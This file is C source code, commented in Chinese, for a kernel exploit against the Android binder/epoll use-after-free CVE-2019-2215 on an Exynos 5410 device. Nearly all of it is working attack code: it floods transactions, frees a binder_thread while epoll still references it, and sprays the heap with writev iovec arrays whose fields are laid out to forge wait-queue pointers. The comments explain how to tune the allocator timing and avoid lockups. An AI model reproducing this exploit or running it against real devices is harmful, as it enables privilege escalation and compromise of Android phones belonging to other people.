/* SPDX-License-Identifier: GPL-3.0-or-later */

/*
 * CVE-2019-2215 binder+epoll UAF —— 3.4.5 (Exynos 5410)
 *
 * drivers/staging/android/binder.c:
 *   binder_poll():        poll_wait(filp, &thread->wait, wait)
 *   binder_free_thread(): kfree(thread)  —— 不摘 waitqueue
 *
 * thread->wait 分支条件：transaction_stack != NULL && todo 空 && return_error==BR_OK
 *
 * 关键：servicemanager 回包极快，reply 路径会立刻 binder_pop_transaction(我们)。
 * 所以先用 N 条同步事务把它的 proc->todo 堵住，让我们的事务排队尾。
 *
 * 用法： bu <flood_total> <del_ms>
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdarg.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/epoll.h>
#include <sys/uio.h>

#define BINDER_WRITE_READ        0xc0186201UL
#define BINDER_VERSION           0xc0046209UL
#define BINDER_THREAD_EXIT       0x40046208UL
#define BC_TRANSACTION           0x40286300UL

struct binder_write_read {
	int32_t  write_size, write_consumed;
	uint32_t write_buffer;
	int32_t  read_size, read_consumed;
	uint32_t read_buffer;
};

struct binder_transaction_data {
	union { uint32_t handle; uint32_t ptr; } target;
	uint32_t cookie;
	uint32_t code;
	uint32_t flags;
	int32_t  sender_pid;
	uint32_t sender_euid;
	uint32_t data_size;
	uint32_t offsets_size;
	union {
		struct { uint32_t buffer; uint32_t offsets; } ptr;
		uint8_t buf[8];
	} data;
};

static int g_fd = -1, g_epfd = -1, g_pipew = -1, g_lf = -1;
static volatile int g_go = 0, g_start = 0, g_exit_ret = 999;
static volatile int g_spray = 0, g_sprayed = 0;
#define NSPRAY 0
static volatile long g_sent = 0, g_target = 0;
static int g_del_ms = 1;
static struct iovec g_iov[32];

static void lg(const char *fmt, ...)
{
	char buf[256];
	va_list ap;
	int n;
	va_start(ap, fmt);
	n = vsnprintf(buf, sizeof buf, fmt, ap);
	va_end(ap);
	if (n > 0) {
		write(1, buf, n);
		if (g_lf >= 0) { write(g_lf, buf, n); fsync(g_lf); }
	}
}

static void lgs(const char *m)
{
	write(1, m, strlen(m));
}

static void pin_cpu(int cpu)
{
	cpu_set_t s;
	CPU_ZERO(&s); CPU_SET(cpu, &s);
	sched_setaffinity(0, sizeof s, &s);
}

static int bwr(int fd, void *wb, int ws, void *rb, int rs, int *rcons)
{
	struct binder_write_read b;
	int r;
	memset(&b, 0, sizeof b);
	b.write_size = ws; b.write_buffer = (uint32_t)(uintptr_t)wb;
	b.read_size  = rs; b.read_buffer  = (uint32_t)(uintptr_t)rb;
	errno = 0;
	r = ioctl(fd, BINDER_WRITE_READ, &b);
	if (rcons) *rcons = b.read_consumed;
	return r;
}

static int send_txn(int fd)
{
	uint8_t wb[4 + sizeof(struct binder_transaction_data)];
	struct binder_transaction_data *tr = (void *)(wb + 4);
	memset(wb, 0, sizeof wb);
	*(uint32_t *)wb = BC_TRANSACTION;
	memset(tr, 0, sizeof *tr);
	tr->target.handle = 0;
	return bwr(fd, wb, sizeof wb, NULL, 0, NULL);
}

/* 发事务 + 排空 todo 合并成一次 ioctl（同一把 binder_lock，省一个 syscall 往返） */
static int send_and_drain(int fd, uint8_t *rbuf, int rsize, int *rcons)
{
	uint8_t wb[4 + sizeof(struct binder_transaction_data)];
	struct binder_write_read b;
	struct binder_transaction_data *tr = (void *)(wb + 4);
	int r;

	memset(wb, 0, sizeof wb);
	*(uint32_t *)wb = BC_TRANSACTION;
	memset(tr, 0, sizeof *tr);
	tr->target.handle = 0;

	memset(&b, 0, sizeof b);
	b.write_size   = sizeof wb;
	b.write_buffer = (uint32_t)(uintptr_t)wb;
	b.read_size    = rsize;
	b.read_buffer  = (uint32_t)(uintptr_t)rbuf;

	errno = 0;
	r = ioctl(fd, BINDER_WRITE_READ, &b);
	if (rcons) *rcons = b.read_consumed;
	return r;
}

/* 每个 binder_thread 只能挂 1 条未完成的同步事务（第 2 条会被
 * "bad transaction stack" 拒绝），所以用 N 个线程、每个只发 1 条。 */
static void *flood_thread(void *a)
{
	long id = (long)a;
	pin_cpu(1 + (int)(id % 3));
	while (!g_start) __sync_synchronize();   /* 全部就位后一起放行 */
	send_txn(g_fd);
	__sync_fetch_and_add(&g_sent, 1);
	return NULL;
}

/* 每个线程在写满的管道上调用 writev(32 iovecs)：内核 kmalloc(256B) 复制 iovec 数组，
 * 32*8 = 256 = sizeof(struct binder_thread) → 同属 kmalloc-256。 */
static void *spray_thread(void *a)
{
	long id = (long)a;
	pin_cpu(1 + (int)(id % 2));           /* 避开主线程的 CPU0，别抢它的调度 */
	while (!g_spray) __sync_synchronize(); /* 空转：要在主线程写完后立刻跟上 */
	__sync_fetch_and_add(&g_sprayed, 1);
	writev(g_pipew, g_iov, 32);
	return NULL;
}

static void *del_thread(void *a)
{
	(void)a;
	pin_cpu(3);
	while (!g_go) __sync_synchronize();
	lg("[X0] go, THREAD_EXIT=%d\n", g_exit_ret);
	{ long g = 0; while (g_sprayed < 1 && g++ < 500000000L) ; }
	{ volatile long i; for (i = 0; i < 80000; i++) ; }    /* 留一点时间让 kmalloc 落位 */
	lg("[X1] sprayed=%d -> DEL\n", g_sprayed);
	errno = 0;
	int r = epoll_ctl(g_epfd, EPOLL_CTL_DEL, g_fd, NULL);
	lg("[X2] DEL r=%d errno=%d\n", r, errno);
	return NULL;
}

int main(int argc, char **argv)
{
	int i, r, rc;
	uint8_t rbuf[512];
	struct epoll_event ev;
	pthread_t del;

	g_target = (argc > 1) ? atol(argv[1]) : 60;
	if (argc > 2) g_del_ms = atoi(argv[2]);

	g_lf = open("/data/local/tmp/o.txt", O_WRONLY | O_CREAT | O_TRUNC, 0644);
	setvbuf(stdout, NULL, _IONBF, 0);
	pin_cpu(0);
	lg("=== bu flood=%ld del=%dms pid=%d ===\n", g_target, g_del_ms, getpid());

	/* ---------- [A] 预置 ---------- */
	g_fd = open("/dev/binder", O_RDWR | O_NONBLOCK);
	if (g_fd < 0) { lg("[!] open errno=%d\n", errno); return 1; }
	void *map = mmap(NULL, 0x400000, PROT_READ, MAP_PRIVATE, g_fd, 0);
	lg("[A1] fd=%d map=%p\n", g_fd, map);

	int ver = -1;
	ioctl(g_fd, BINDER_VERSION, &ver);
	lg("[A2] ver=%d\n", ver);

	g_epfd = epoll_create(16);
	memset(&ev, 0, sizeof ev);
	ev.events = EPOLLIN;

	int pfd[2];
	if (pipe(pfd)) { lg("[!] pipe errno=%d\n", errno); return 1; }
	g_pipew = pfd[1];
	fcntl(g_pipew, F_SETFL, O_NONBLOCK);
	{
		static char fill[4096];
		int total = 0;
		for (;;) { int n = write(g_pipew, fill, sizeof fill); if (n <= 0) break; total += n; }
		fcntl(g_pipew, F_SETFL, 0);
		lg("[A3] pipe=%d\n", total);
	}

	/* 本 ELF 非 PIE，首个 PT_LOAD 在 0x10000（只读代码段），可直接当 prev 的最后一级指针用 */
	void *dat = mmap(NULL, 0x4000, PROT_READ | PROT_WRITE,
	                 MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (dat == MAP_FAILED) { lg("[!] dat errno=%d\n", errno); return 1; }
	memset(dat, 0, 0x4000);
	lg("[A4] dat=%p\n", dat);

	for (i = 0; i < 32; i++) {
		g_iov[i].iov_base = (void *)(uintptr_t)((char *)dat + 0x800);
		g_iov[i].iov_len  = 0x40;
	}
	/* chunk+0x28 = wait.lock 低半? 不对——wait_queue_head_t: lock@+0x00, task_list@+0x04
	 * 而 wait 在 binder_thread 的 0x2c，所以：
	 *   chunk+0x2c = lock        = iov[5].iov_len
	 *   chunk+0x30 = task_list.next = iov[6].iov_base
	 *   chunk+0x34 = task_list.prev = iov[6].iov_len
	 * lock 必须为 0（ARM ticket spinlock: owner==next 才算空闲），
	 * 否则 remove_wait_queue 的 spin_lock 会在关中断下死转 → 整核挂死。 */
	g_iov[5].iov_len  = 0;
	g_iov[6].iov_base = (void *)(uintptr_t)dat;   /* next → 已映射的匿名页（内容 0） */
	g_iov[6].iov_len  = 0x10000;                  /* prev → 只读代码段，已映射 */

	pthread_create(&del, NULL, del_thread, NULL);
	{
		static pthread_t sth[NSPRAY + 1];
		for (i = 0; i < NSPRAY; i++)
			pthread_create(&sth[i], NULL, spray_thread, (void *)(long)i);
	}

	/* ---------- [B] 每个线程 1 条，堆 N 条队列 ---------- */
	{
		static pthread_t fth[256];
		int n = (g_target > 256) ? 256 : (int)g_target;
		for (i = 0; i < n; i++)
			pthread_create(&fth[i], NULL, flood_thread, (void *)(long)i);
		usleep(2000);                 /* 等线程全部就位（都停在 g_start 上） */
		g_start = 1;
		{
			long guard = 0;
			while (g_sent < n && guard++ < 50000000L) ;
		}
	}

	/* ---------- [C] 关键段：只允许 syscall，不做任何日志 ----------
	 * 只需要保证「epoll_ctl(ADD) 那一刻 binder_poll 走了 poll_wait(&thread->wait)」。
	 * 之后回包到达只会把 epitem 唤醒，不会撤销注册——所以不必检查 epoll_wait。 */
	int ok = 0;
	rc = 0;

	/* === 刷新 binder_thread ===
	 * SLUB 的坑：kfree 若发现对象不属于当前 cpu slab，只挂回原 page 的 freelist，
	 * 紧接的 kmalloc 仍从 cpu slab 取 → 拿不到。
	 * 先 THREAD_EXIT 释放旧 thread，再用一次 binder ioctl 重新 kzalloc 一个：
	 * 新对象一定来自当前 cpu slab，之后释放就会走快路径回到 c->freelist。 */
	ioctl(g_fd, BINDER_THREAD_EXIT, NULL);
	{
		int v2 = -1;
		ioctl(g_fd, BINDER_VERSION, &v2);
	}

	send_txn(g_fd);                       /* write 单独一次 ioctl */
	lgs("[p1]sent\n");
	bwr(g_fd, NULL, 0, rbuf, 52, &rc);    /* read 单独一次 */
	lgs(rc == 8 ? "[p2]rc8\n" : "[p2]rc!\n");
	if (rc == 8) {
		ok = (epoll_ctl(g_epfd, EPOLL_CTL_ADD, g_fd, &ev) == 0);
		lgs(ok ? "[p3]added\n" : "[p3]fail\n");
	}
	if (!ok) {
		lg("[C-FAIL] sent=%ld rc=%d send_r=%d\n", g_sent, rc, r);
		return 2;
	}

	/* 释放 binder_thread：waitqueue head 随之悬空，但 epitem 仍链在上面 */
	lgs("[p4]exit...\n");
	r = ioctl(g_fd, BINDER_THREAD_EXIT, NULL);
	lgs("[p5]exited\n");
	g_exit_ret = r;                       /* 结果交给 DEL 线程去写日志（此处不能写，会拖慢 writev） */
	g_go = 1;
	g_spray = 1;                          /* 8 个线程 + 主线程一起抢 kmalloc-256 */
	__sync_fetch_and_add(&g_sprayed, 1);
	__sync_synchronize();
	{
		ssize_t nw = writev(g_pipew, g_iov, 32);
		lg("[C7] writev=%zd errno=%d (DEL 未崩) sprayed=%d\n", nw, errno, g_sprayed);
	}
	sleep(1);
	return 0;
}
